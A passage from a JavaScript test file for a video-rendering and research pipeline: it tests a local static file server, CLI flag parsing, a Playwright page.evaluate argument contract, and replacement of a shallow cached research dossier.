      return new Promise((resolve, reject) => {
        const req = http.get(serverInstance.baseUrl + targetPath, (res) => {
          let body = '';
          res.on('data', chunk => body += chunk);
          res.on('end', () => resolve({ statusCode: res.statusCode, headers: res.headers, body }));
        });
        req.on('error', reject);
      });
    }

    // 1. Fetch stage.html
    const stageRes = await fetchUrl('/stage.html');
    assert.strictEqual(stageRes.statusCode, 200);
    assert.ok(stageRes.headers['content-type'].includes('text/html'));
    assert.strictEqual(stageRes.body, stageContent);

    // 2. Fetch root / (defaults to stage.html)
    const rootRes = await fetchUrl('/');
    assert.strictEqual(rootRes.statusCode, 200);
    assert.strictEqual(rootRes.body, stageContent);

    // 3. Fetch /assets/sample-metadata.json
    const assetRes = await fetchUrl('/assets/sample-metadata.json');
    assert.strictEqual(assetRes.statusCode, 200);
    assert.ok(assetRes.headers['content-type'].includes('application/json'));
    assert.deepStrictEqual(JSON.parse(assetRes.body), { verified: true, engine: 'vector-html' });

    // 4. Fetch nonexistent file returns 404
    const notFoundRes = await fetchUrl('/nonexistent-document.pdf');
    assert.strictEqual(notFoundRes.statusCode, 404);
  } finally {
    if (serverInstance && typeof serverInstance.close === 'function') {
      await serverInstance.close();
    }
    try {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    } catch (_) {}
  }
});

// ============================================================================
// 8. Research Validation & Playwright Single-Object Evaluation Contract
// ============================================================================

test('8. Schema & CLI: parses --force-research flag accurately', () => {
  const cliParsed = parseCliArgsToConfig(['--force-research', '--topic', 'Test Topic']);
  assert.strictEqual(cliParsed.forceResearch, true, '--force-research should set forceResearch: true');

  const normalized = normalizePipelineConfig({ forceResearch: true });
  assert.strictEqual(normalized.forceResearch, true, 'normalizePipelineConfig should preserve forceResearch');

  const normalizedDefault = normalizePipelineConfig();
  assert.strictEqual(normalizedDefault.forceResearch, false, 'normalizePipelineConfig should default forceResearch to false');
});

test('8. Playwright Contract: verify scripts/render.js page.evaluate wraps multiple arguments in single object', () => {
  const renderSource = fs.readFileSync(path.join(__dirname, '../scripts/render.js'), 'utf8');

  // Verify that captureKeyframes evaluate does not pass separate parameters
  assert.ok(
    renderSource.includes('page.evaluate(({ target, beatStartMs })'),
    'scripts/render.js must wrap target and beatStartMs in a single object parameter to prevent Playwright error'
  );
  assert.ok(
    !renderSource.includes('await page.evaluate((target, beatStartMs) =>'),
    'scripts/render.js must not pass raw multiple arguments to page.evaluate'
  );
});

test('8. Deep Research: verify runResearchStage enforces empirical evidence and rejects shallow placeholders', async () => {
  const { runResearchStage } = require('../scripts/pipeline');
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'arch-test-research-'));
  const origAgy = process.env.AGY_BIN;
  process.env.AGY_BIN = path.join(tmpDir, 'nonexistent-agy');

  try {
    const researchDir = path.join(tmpDir, 'research');
    fs.mkdirSync(researchDir, { recursive: true });

    // 1. Write a shallow/placeholder dossier
    const shallowDossier = {
      topic: 'Test Topic',
      channel: 'kausalmedia',
      primaryAnomaly: 'Anomali perputaran kapital dan struktur insentif tersembunyi di balik fenomena Test Topic',
      keyEntities: [{ name: 'Regulator Terkait' }]
    };
    fs.writeFileSync(path.join(researchDir, 'dossier.json'), JSON.stringify(shallowDossier), 'utf8');

    // 2. Calling runResearchStage should detect shallow cache and generate a domain-rich dossier
    const result = await runResearchStage({
      projectDir: tmpDir,
      topic: 'MSCI Standalone Market Crash: Anatomi Likuiditas dan Ilusi Free Float IHSG',
      channel: 'kausalmedia'
    });

    assert.ok(result, 'Research dossier must be generated');
    assert.notStrictEqual(result.primaryAnomaly, shallowDossier.primaryAnomaly, 'Shallow placeholder must be replaced');
    assert.ok(result.forensicEvidence && result.forensicEvidence.length > 0, 'Must contain forensic evidence');
    assert.ok(result.causalMechanics && result.causalMechanics.length > 0, 'Must contain causal mechanics');
    assert.ok(result.unitEconomics && result.unitEconomics.keyMetrics, 'Must contain unit economics');
  } finally {
    process.env.AGY_BIN = origAgy;
    try {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    } catch (_) {}
  }
});

